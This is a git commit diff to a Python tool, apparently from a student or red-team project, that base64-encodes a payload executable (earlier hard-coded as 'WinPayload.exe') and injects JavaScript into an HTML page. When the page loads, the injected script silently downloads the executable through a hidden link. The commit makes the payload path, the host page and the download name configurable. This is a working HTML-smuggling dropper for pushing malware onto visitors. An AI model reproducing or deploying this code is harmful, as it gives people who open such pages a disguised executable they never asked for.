55b4ae39169dcf5ad209de7220de1c494b5e29a2
strombach <fredde.stromback@gmail.com>
2024-11-01 16:50:11 +0100

    Adding arguments to python code and remove some more unnecessary javascript.

--- Projekt/toolbox/html_gen.py
+++ Projekt/toolbox/html_gen.py
@@ -8,36 +8,35 @@ HELP_STRING = """
         """
 
 def create_javascript(data, fileName):
-    js_script = f"""
+    return f"""
         const data = window.atob("{data}")
         const fileName = "{fileName}"
 
         const blob = new Blob([data], {{type: 'octet/stream'}})
 
         const a = document.createElement('a')
-        document.body.appendChild(a);
-        a.style = 'display: none';
-        const url = window.URL.createObjectURL(blob);
+        document.body.appendChild(a)
+        a.style = 'display: none'
+        const url = window.URL.createObjectURL(blob)
         a.href = url;
-        a.download = fileName;
-        a.click();
-        window.URL.revokeObjectURL(url);
+        a.download = "{fileName}"
+        a.click()
+        window.URL.revokeObjectURL(url)
     """
-    return js_script
 
 def main(flags):
 
-    with open("./payload/WinPayload.exe", "rb") as payload_file:
+    with open(f"{flags.payload}", "rb") as payload_file:
         binary_data = payload_file.read()
         encoded_data = base64.b64encode(binary_data).decode()
 
-    with open("toolbox/index.html", "r", encoding="utf-8") as original_file:
+    with open(flags.htmlfile, "r", encoding="utf-8") as original_file:
         html_content = original_file.read()
 
     soup = BeautifulSoup(html_content, "html.parser")
 
     new_script = soup.new_tag("script")
-    new_script.string = create_javascript(encoded_data, "test.exe")
+    new_script.string = create_javascript(encoded_data, flags.downloadname)
     soup.body.append(new_script)
 
     with open("modified_index.html", "w", encoding="utf-8") as new_file:
@@ -53,6 +52,9 @@ if __name__ == "__main__":
     # Mandatory
     parser.add_argument("-p","--payload", help="The payload to embed in the html", required=True)
     parser.add_argument("-hf","--htmlfile", help="The html file to embed into", required=True)
+
+    # Optional
+    parser.add_argument("-dn","--downloadname", default="test.exe", help="The name of the file when downloaded")
 
     argparse_args = parser.parse_args()
 
